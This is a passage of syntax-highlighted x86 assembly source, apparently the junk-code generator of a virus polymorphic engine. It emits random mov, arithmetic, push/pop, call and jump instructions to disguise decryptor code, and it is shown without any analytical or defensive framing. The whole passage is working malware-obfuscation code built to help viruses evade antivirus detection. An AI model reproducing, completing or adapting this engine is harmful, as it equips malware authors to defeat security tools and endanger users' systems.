        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_no_flags</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gg_test</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__gg_finish</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gg_jump</span><span class="sc0">

    </span><span class="sc5">__ggl_flags</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_garbage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gg_test</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__gg_finish</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc5">__gg_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__gg_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__gg_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

    </span><span class="sc5">__gg_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gg_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">USED_BASED</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ggt_success</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">__garbage_based_num</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__ggt_success</span><span class="sc0">
    </span><span class="sc5">__ggt_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc5">__ggt_success</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">; gnerate garbage which will not modify flags (mov,stack...)</span><span class="sc0">
</span><span class="sc5">gen_garbage_no_flags</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">],</span><span class="sc5">USED_FLAGS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate mov reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_movreg32imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;mov empty_reg32,imm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg16imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;mov empty_reg16,imm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B866h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;mov empty_reg8,imm</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movreg8imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate mov reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;mov empty_reg32,reg32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">g_movregreg32</span><span class="sc0">       </span><span class="sc1">;mov ecx,ecx ? etc. ?</span><span class="sc0">
</span><span class="sc5">c_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movregreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;mov empty_reg16,reg16</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">g_movregreg16</span><span class="sc0">       </span><span class="sc1">;mov si,si ? etc. ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_movregreg32</span><span class="sc0">

</span><span class="sc5">g_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;mov empty_reg8,reg8</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">g_movregreg8</span><span class="sc0">        </span><span class="sc1">;mov al,al ? etc. ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2400h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_mathreg32imm</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">          </span><span class="sc1">;math reg32,imm</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_work</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathreg16imm</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8166h</span><span class="sc0">        </span><span class="sc1">;math reg16,imm</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_work</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathreg8imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;math reg8,imm</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_mathreg8imm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_work</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_mathreg8imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_math_work</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;select math operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_math_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_math_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate push reg + garbage + pop reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_push_g_pop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">     </span><span class="sc1">;   push rnd_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">          </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;   pop empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate call without return ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_call_cont</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">         </span><span class="sc1">;   call    __here</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;__here:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_block</span><span class="sc0">   </span><span class="sc1">;   pop empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate unconditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_jump_u</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">;   jmp __here</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;__here:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_block</span><span class="sc0">   </span><span class="sc1">;   --next code--</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate conditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_jump_c</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;   jX __here</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;__here:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;   --next code--</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
